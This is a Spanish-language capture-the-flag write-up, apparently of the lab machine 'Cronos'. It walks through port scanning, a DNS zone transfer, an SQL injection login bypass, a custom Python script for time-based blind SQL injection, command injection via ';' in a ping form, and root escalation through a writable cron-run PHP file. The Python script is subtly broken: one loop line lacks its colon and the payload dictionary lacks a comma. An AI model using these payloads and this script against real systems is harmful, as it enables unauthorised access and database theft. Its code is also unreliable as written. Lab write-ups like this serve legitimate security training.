--------
- Tags: #cron-job #AXFR #sqli #sqli-timebassed #command-injection #python3 #python-scripting 
-------
## Técnicas utilizadas
- Domain Zone Transfer (AXFR)  
- SQLI (Blind Time Based) - Creating a custom Python script  
- Command Injection  
- Abusing Cron Job [Privilege Escalation]
## Procedimiento

![[Pasted image 20230718194839.png]]

#### Reconocimiento
Si lanzamos un **nmap** sobre la maquina podemos encontrar los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,53,80 10.10.10.13 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 10:45 MST
Nmap scan report for 10.10.10.13
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds
```

Un escaneo con **whatweb** nos muestra las siguientes tecnologías corriendo por detrás:
```ruby
# whatweb 10.10.10.13
http://10.10.10.13 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.13], Title[Apache2 Ubuntu Default Page: It works]
```

Vemos que en la pagina principal vemos el **index.html** por default de **apache2**. Podemos intentar descubrir algunos directorios con **Gobuster** o **Wfuzz** pero no llegaremos a dar con nada.

------------
#### Domain Zone Transfer (AXFR)
Como no podemos ver el nombre de dominio para ver si se esta aplicando **virtual hosting** podemos tirar de herramientas como **nslookup** para intentar dar con el:
```
# nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
```

Colocamos el nombre en el **/etc/hosts** reiniciamos la pagina y podemos ver el contenido de la pagina ahora:
![[Pasted image 20230719104958.png]]

Vemos que el puerto **53** esta abierto. Cuando el puerto **53 Domain** esta abierto, se puede intentar una transferencia de zona con la herramienta **dig**:
```
# dig @10.10.10.10 cronos.htb AXRF
```

Y podemos ver todos los subdominios disponibles para este dominio:
```
# dig @10.10.10.13 cronos.htb AXFR

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> @10.10.10.13 cronos.htb AXFR
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 423 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP)
;; WHEN: Wed Jul 19 10:50:21 MST 2023
;; XFR size: 7 records (messages 1, bytes 203)
```

-----------------------
#### SQLI (Blind Time Based) - Creating a custom Python script  
Si ingresamos al **subdominio** que acabamos de descrubrir, encontramos un panel para atenticarnos:
![[Pasted image 20230719105132.png]]

Si intentamos alguna de las inyecciones basicas de **SQL** vemos que es completamente vulnerable, en este caso coloque **' or 1=1-- -** y pude burlar la autentificación. Podemos aprovecharnos de estos campos vulnerables para enumerar la base de datos y asi extrar información privilegiada. El tipo de inyeción SQL a la que es vulnerable es basada en tiempo, asi que para ahorrarnos mucho el tiempo vamos a programar un script en python3 para agilizar la tarea:

```python
#!/usr/bin/python3
import signal
import string
import pdb
from pwn import *

# Ctrl + C
def def_handler(sig, frame):
	print("\n[!] Saliendo...\n")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://admin.cronos.htb/index.php"
characters = string.ascii_lowercase

def makeRequest():

	p1 = log.progress("Iniciando proceso de fuerza bruta")
	p1.status("SQLi")


	time.sleep(2)

	p2 = log.progress("Database")
	
	table_name = ""
	for table in range(0,5)
		for position in range(1,10):
			for character in characters:
				post_data = {
					'username' : "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c', sleep(5),1)-- -" % (table, position, character)
					'password' : 'password'
				}
			
				p1.status(post_data['username'])
				time_start = time.time()
				r = requests.post(login_url, data=post_data)
				time_end = time.time()

				if time_end - time_start > 5:
					table_name += character
					p2.status(table_name)
					break
		table_name += ", "

if __name__ == "__main__":
	makeRequest()
	
```

----------
#### Command Injection  
Una vez dentro, vemos algunas opciones para realizar. Podemos mandar un **ping** o **trace route**, y se ve en el output que se este ejecutando un comando a nivel de sistema. Intentamos colar un comando colocando **;** y vemos que, en efecto, tenemos capacidad de ejecucion remota de comandos:
![[Pasted image 20230719125017.png]]

--------------
#### Abusing Cron Job [Privilege Escalation]
Haciendo una enumeración basica del sistema, podemos encontrar que existe una tarea cron que esta ejecutandose como el usuario root:
![[Pasted image 20230719124644.png]]

Si listamos los permisos del archivo que se ejecuta con PHP, podemos observar que tenemos permisos de escritura sobre estos. Ahora solo quedaria meter el codigo que nosotros deseemos en el archivo y esperar a que se ejecute para ganar acceso como root o leer archivos de root.